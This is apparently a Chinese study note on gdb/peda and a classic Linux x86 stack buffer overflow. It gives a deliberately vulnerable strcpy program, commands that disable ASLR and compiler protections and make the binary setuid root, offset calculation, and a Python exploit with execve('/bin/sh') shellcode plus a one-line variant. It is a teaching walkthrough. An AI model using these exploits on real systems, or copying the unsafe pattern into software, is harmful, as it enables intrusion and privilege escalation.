# gdb使用
#### gdb使用

gdb GNU Project Debugger  
在linux下面调试程序必然会用到gdb，当然还有gdb的一个插件也是必须，那就是[peda](https://github.com/longld/peda)  
peda增强了gdb的功能，在调试过程中会显示反汇编的代码、寄存器、内存信息等

- aslr – 显示和设置GDB的aslr
- checksec – 显示多种安全机制的开关
- dumpargs – 当停到一个call 指令的时候，显示传递给函数的参数
- dumpprop – dump所有ROP gadgets 在一定的内存范围内
- elfheader – 获取被调试的ELF文件的头信息
- lefsymbol –获取非调试状态下的 符号信息
- lookup – 在一定地址范围内查找所有的地址以及引用
- patch – Patch memory start at an address with string/hexstring/int
- pattern – Generate, search, or write a cyclic pattern to memory
- procinfo – 从/proc/pid/显示不同的信息
- pshow – 显示peda的选项以及其它的设置
- pset – 设置peda的选项以及其它的设置
- readelf 获取ELF文件的头部信息
- ropgadget – Get common ROP gadgets of binary or library
- ropsearch – Search for ROP gadgets in memory
- searchmem|find – Search for a pattern in memory; support regex search
- shellcode – Generate or download common shellcodes.
- skeleton – Generate python exploit code template
- vmmap – Get virtual mapping address ranges of section(s) in debugged process
- xormem – XOR a memory region with a key

在gdb中，常用的就是如下的命令  
attach 附加某个进程进行调试  
run 运行程序 ，会在断点处停下来  
break或者b xxx ，下断点  
next 类似于od中的单步步过  
step 类似于od中的单步步入

#### 简介

## 什么是缓冲区溢出

- 拷贝源buffer到目的buffer可以导致溢出漏洞，需要满足两个条件
- 1.源的string长度超过目的string的长度
- 2.没有对拷贝的长度做检查
    
    ## 两种缓冲区溢出
    
- 1.栈溢出-目的缓冲区是在栈中
- 2.堆溢出-目的缓冲区是在堆中
- 下面这张图展示了linux中内存的分块情况。  
    [![](_v_images/20200516113901014_16874.jpg)](https://kevien.github.io/2017/08/16/linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/linux-memory-segment.jpg)
    
    ## 后果
    
- 缓冲区溢出可以导致任意代码执行
    
    #### 示例
    
    ## 1.漏洞示例代码
    
    | <br> | <br> |
    | --- | --- |
    | 1  2  3  4  5  6  7  8  9  10   | //vuln.c  #include <stdio.h>  #include <string.h>    int main(int argc, char* argv\[\]) {   /\* \[1\] */ char buf\[256\];   /\* \[2\] */ strcpy(buf,argv\[1\]);   /\* \[3\] */ printf("Input:%s\\n",buf);   return 0;  }   |
    
- 注：本次测试的是在ubuntu14.04的X86上做的测试。
    
- 在编译之前我们首先要关闭系统的ASLR 方法是
    
    | <br> | <br> |
    | --- | --- |
    | 1  2   | sudo -s  echo 0 > /proc/sys/kernel/randomize\_va\_space   |
    
- 编译
    
    | <br> | <br> |
    | --- | --- |
    | 1  2  3  4   | $gcc -g -fno-stack-protector -z execstack -o vuln vuln.c //这里编译选项是关闭DEP和stack protector  $sudo chown root vuln  $sudo chgrp root vuln  $sudo chmod +s vuln   |
    

## 2.如何利用

- 任意代码执行使用的技术叫做“覆盖返回地址”，就是攻击者覆盖掉栈中的“返回地址”从而让指令寄存器转向去执行我们构造好的恶意代码。
- 在看漏洞的利用代码之前，为了更好的理解，让我们来看一下这段有漏洞的代码的反汇编代码。
    
    | <br> | <br> |
    | --- | --- |
    | 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26   | Dump of assembler code for function main:   //Function Prologue   0x08048414 <+0>:	push   ebp                      //备份调用者的ebp   0x08048415 <+1>:	mov    esp,ebp                 //设置esp和ebp相同     0x08048417 <+3>:	and    0xfffffff0,esp          //栈对齐   0x0804841a <+6>:	sub    0x110,esp               //开辟栈空间   0x08048420 <+12>:	mov    0xc(ebp),eax            //eax = argv   0x08048423 <+15>:	add    $0x4,eax                 //eax = &argv\[1\]   0x08048426 <+18>:	mov    (eax),eax               //eax = argv\[1\]   0x08048428 <+20>:	mov    eax,0x4(esp)            //拷贝arg2   0x0804842c <+24>:	lea    0x10(esp),eax           //eax = 'buf'    0x08048430 <+28>:	mov    eax,(esp)               //拷贝 arg1   0x08048433 <+31>:	call   0x8048330 <strcpy@plt>    //调用 strcpy   0x08048438 <+36>:	mov    $0x8048530,eax           //eax = format str "Input: s\\n"   0x0804843d <+41>:	lea    0x10(esp), edx           //edx = buf   0x08048441 <+45>:	mov    edx,0x4(esp)            //printf arg2   0x08048445 <+49>:	mov    eax,(esp)               //printf arg1   0x08048448 <+52>:	call   0x8048320 <printf@plt>    //调用 printf   0x0804844d <+57>:	mov    $0x0,eax                 //return value 0     //收尾函数   0x08048452 <+62>:	leave                            //mov ebp, esp; pop ebp;    0x08048453 <+63>:	ret                              //return  End of assembler dump.  (gdb)   |
    

[![](_v_images/20200516113834575_6651.png)](https://kevien.github.io/2017/08/16/linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/stackmap.png)

## 3.测试步骤

- 1.是否可以覆盖返回地址  
    [![](_v_images/20200516113826245_23051.png)](https://kevien.github.io/2017/08/16/linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/test1.png)
- 可以看到当我们输出300个A的时候，程序EIP的指向了地址0x41414141（即我们用AAAA覆盖掉了返回地址）
- 2.目标buffer的偏移怎么计算
- 就是覆盖掉的地址换成我们恶意代码的入口地址怎么计算，他是0x10c=0x100（就是那256个字节）+0x8（对齐）+0x4（call ebp指令长度）
- 因此当我们输入“A”*268+“B”*4的时候，就会依次覆盖掉buf、对齐、以及call ebp，即返回地址就是“BBBB”  
    [![](_v_images/20200516113725543_31950.png)](https://kevien.github.io/2017/08/16/linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/test2.png)  
    正如我们所想！如上我们就控制了返回地址，且这个地址就在0xbfffeeb0这个地址上存放着。  
    [![](_v_images/20200516113657734_19010.png)](https://kevien.github.io/2017/08/16/linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/test22.png)
- 3.编写测试代码
    
    | <br> | <br> |
    | --- | --- |
    | 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21   | #!/usr/bin/env python  import struct  from subprocess import call    #Stack address where shellcode is copied.  ret_addr = 0xbfffeeb0       #Spawn a shell  #execve(/bin/sh)  scode = "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"    #endianess convertion  def conv(num):   return struct.pack("<I",num)  buf = "A" * 268  buf += conv(ret_addr)  buf += "\\x90" * 100  buf += scode    print "Calling vulnerable program"  call(\["./vuln", buf\])   |
    
- 4.结果截图  
    [![](_v_images/20200516113652391_15171.png)](https://kevien.github.io/2017/08/16/linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/result.png)
    
    | <br> | <br> |
    | --- | --- |
    | 1   | ./vuln \`python -c "print 'A'\*268+'\\x80\\xee\\xff\\xbf'+'\\x90'\*100 + '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'"\`   |
    

[![](_v_images/20200516113644932_8938.png)](https://kevien.github.io/2017/08/16/linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/commandlineexp.png)

#### 小结

- 这里为了测试了简单的缓冲区溢出的基本原理我们关掉了一些防护比如内存地址随机化aslr以及DEP，后面有时间再学习和分享一下绕过这些防护的方法。
    
    #### Reference
    
    [Classic Stack Based Buffer Overflow](https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/)  
    \[How to exploit a buffer overflow vulnerability - Practical\]  
    ([https://www.youtube.com/watch?v=hJ8IwyhqzD4](https://www.youtube.com/watch?v=hJ8IwyhqzD4))  
    [Buffer Overflow Attack - Computerphile](https://www.youtube.com/watch?v=1S0aBV-Waeo)  
    [Kali Linux 2016.1 - Buffer Overflow Tutorial](https://www.youtube.com/watch?v=eYrfWpkvMxA)  
    [Linux gdb调试器用法全面解析](http://blog.csdn.net/21cnbao/article/details/7385161)  
    [一步一步学ROP之linux_x86篇](http://drops.xmd5.com/static/drops/tips-6597.html)  
    [linux溢出练习](https://exploit-exercises.com/)  
    [Nebula Shell Exploits](http://louisrli.github.io/blog/2012/06/22/nebula0/#.WnGH9pP1U0o)  
    [Linux (x86) Exploit Development Series](https://sploitfun.wordpress.com/2015/)  
    [DEF CON CTF Quals 2015: r0pbaby](https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/DEFCONCTF/babysfirst/r0pbaby)  
    [聊聊Linux动态链接中的PLT和GOT（１）——何谓PLT与GOT](http://blog.csdn.net/linyt/article/details/51635768)  
    [How to exploit a buffer overflow vulnerability - Practical](https://www.youtube.com/watch?v=hJ8IwyhqzD4)
